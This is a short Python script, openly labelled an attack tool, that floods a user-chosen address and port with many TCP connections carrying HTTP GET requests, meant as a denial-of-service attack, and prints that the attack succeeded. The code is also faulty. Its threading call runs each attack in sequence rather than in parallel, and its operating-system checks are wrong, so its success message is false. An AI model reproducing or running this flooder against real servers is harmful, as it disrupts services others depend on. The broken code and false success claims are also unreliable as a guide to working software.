import os
import platform
import sys
import threading
import socket
from platform import system

attack_ddos_prefix = "[attack-tool] "

target_address = '127.0.0.1'
target_port: int = 80

threads_index: int = 3000
connected = 0

def bootstrap():
    setup_system()

def clear():
    if system() == "Linux":
        os.system("clear")
    else:
        if system(sys.version) == "Windows":
            os.system("cls")


def remote_ip():
    return '182.21.20.32'

def attack(address, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))
    s.sendto(("GET /" + address + " HTTP/1.1\r\n").encode('ascii'), (address, port))
    s.sendto(("Host: " + remote_ip() + "\r\n\r\n").encode('ascii'), (address, port))
    s.close()
    print("new thread started")

def threads(index, address, port):
    for i in range(index):
        thread = threading.Thread(target=attack(address, port))
        thread.start()
    print(attack_ddos_prefix + "the dos attack was successfully executed!")

def setup_system():
    if os.system(" ") == "Linux":
        print(attack_ddos_prefix + "starting attack tool on unix")
    else:
        print(attack_ddos_prefix + "starting attack tool on win")

    threads(
        int(input("how fallen threads should there be : ")),
        input("to which address should the client be bound: "),
        int(input("on which port should the attack be executed: ")))


bootstrap()

